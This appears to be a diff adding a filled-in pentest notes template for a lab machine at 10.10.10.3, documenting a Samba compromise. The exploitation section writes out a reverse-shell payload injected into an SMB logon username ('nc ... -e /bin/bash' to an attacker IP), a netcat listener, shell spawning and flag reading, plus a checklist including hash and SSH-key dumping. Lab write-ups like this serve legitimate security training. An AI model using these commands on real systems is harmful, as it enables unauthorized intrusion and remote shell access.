@@ -1,0 +1,333 @@
+# 10.10.10.3
+
+
+## Enumeration
+nmap -sT -sV -O -p- 10.10.10.3 -v
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.18 (ClarkConnect 4.3 Enterprise Edition) (92%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.013 days (since Mon Jan 17 15:08:07 2022)
+TCP Sequence Prediction: Difficulty=197 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+### TCP
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+
+vsftpd 2.3.4 has a backdoor but not exploitable (Manual Exploitation + Metasploit yielded no results)
+
+### UDP
+
+
+### Web Services
+
+
+#### Nikto
+
+
+#### Dirb\DirBuster
+
+
+#### WebDav
+
+
+#### CMS
+
+
+### Other Services
+
+
+#### SMB
+
+
+#### SNMP
+
+
+#### DB
+
+
+#### Other
+
+
+## Exploitation
+Service Exploited:  Samba 3.x - 4.x
+Vulnerability Type: Remote Code Exectution
+Exploit POC:
+Description: 
+
+A reverse shell payload can be put into the username when logging to smb.
+
+Discovery of Vulnerability
+
+
+
+
+
+
+Exploit Code Used
+
+
+1. Enumerate the SMB shares:
+
+smbclient -L //10.10.10.3
+
+We will found a share called tmp which allows anonymous login.
+
+2. Connect to /tmp share:
+
+smbclient //10.10.10.3/tmp
+
+3. Start a netcat listener on our attacker machine:
+
+nc -nvlp 4444
+
+4. Switch to a new user, which contains a reverse shell payload:
+
+logon “`/=`nc 10.10.14.37 4444 -e /bin/bash``”
+
+5. Spawn a TTY and interactive shell:
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+bash -i
+
+6. user and root flags:
+
+cat /root/root.txt
+cat /home/makis/user.txt
+
+
+
+Proof\Local.txt File
+
+   ☑ Screenshot with ifconfig\ipconfig
+   ☐ Submit too OSCP Exam Panel
+
+
+
+
+
+
+
+
+## Post Exploitation
+
+
+### Script Results
+
+
+### Host Information
+Operating System
+
+
+
+Architecture
+
+
+
+Domain
+
+
+
+Installed Updates
+
+
+
+### File System
+Writeable Files\Directories
+
+
+
+Directory List
+
+
+
+
+
+
+### Running Processes
+Process List
+
+### Installed Applications
+Installed Applications
+
+### Users & Groups
+Users
+
+
+
+
+Groups
+
+### Network
+IPConfig\IFConfig
+
+
+
+
+Network Processes
+
+
+
+
+ARP
+
+
+
+
+DNS
+
+
+
+
+Route
+
+### Scheduled Jobs
+Scheduled Tasks
+
+## Priv Escalation
+Service Exploited:  
+Vulnerability Type:
+Exploit POC:
+Description: 
+
+Discovery of Vulnerability
+
+
+
+
+
+
+Exploit Code Used
+
+
+
+
+
+
+
+Proof\Local.txt File
+
+   ☐ Screenshot with ifconfig\ipconfig
+   ☐ Submit too OSCP Exam Panel
+
+
+
+## Goodies
+
+
+### Hashes
+
+
+### Passwords
+
+
+### Proof\Flags\Other
+root.txt: e22bc7f6a408482b2e479df1dd569c7d
+user.txt: 43fdf6c1a2bccaf0dfd0347d5be376ea
+
+## Software Versions
+Software Versions
+
+
+
+
+
+
+Potential Exploits
+
+## Methodology
+Network Scanning
+
+   ☐  nmap -sn 10.11.1.*
+   ☐  nmap -sL 10.11.1.*
+   ☐  nbtscan -r 10.11.1.0/24
+   ☐  smbtree
+
+Individual Host Scanning
+
+   ☐  nmap  --top-ports 20 --open -iL iplist.txt
+   ☐  nmap -sS -A -sV -O -p- ipaddress
+   ☐  nmap -sU ipaddress
+
+Service Scanning
+
+    WebApp
+      ☐   Nikto
+      ☐   dirb
+      ☐   dirbuster
+      ☐   wpscan
+      ☐   dotdotpwn
+      ☐   view source 
+      ☐   davtest\cadevar
+      ☐   droopscan
+      ☐   joomscan
+      ☐   LFI\RFI Test
+      
+    Linux\Windows
+      ☐   snmpwalk -c public -v1 ipaddress 1
+      ☐   smbclient -L //ipaddress
+      ☐   showmount -e ipaddress port
+      ☐   rpcinfo
+      ☐   Enum4Linux
+    
+    Anything Else
+      ☐   nmap scripts (locate *nse* | grep servicename)
+      ☐   hydra
+      ☐   MSF Aux Modules
+      ☐   Download the softward
+
+Exploitation
+   ☐   Gather Version Numbes
+   ☐   Searchsploit
+   ☐   Default Creds
+   ☐   Creds Previously Gathered
+   ☐   Download the software
+
+Post Exploitation
+
+    Linux
+      ☐   linux-local-enum.sh
+      ☐   linuxprivchecker.py
+      ☐   linux-exploit-suggestor.sh
+      ☐   unix-privesc-check.py
+
+    Windows
+      ☐   wpc.exe
+      ☐   windows-exploit-suggestor.py
+      ☐   windows_privesc_check.py
+      ☐  	windows-privesc-check2.exe
+
+Priv Escalation
+   ☐  acesss internal services (portfwd)
+   ☐  add account
+
+Windows
+   ☐  List of exploits
+
+Linux
+   ☐  sudo su 
+   ☐  KernelDB
+   ☐  Searchsploit
+
+Final
+   ☐  Screenshot of IPConfig\WhoamI
+   ☐  Copy proof.txt
+   ☐  Dump hashes 
+   ☐  Dump SSH Keys
+   ☐  Delete files
+
+## Log Book
+
+
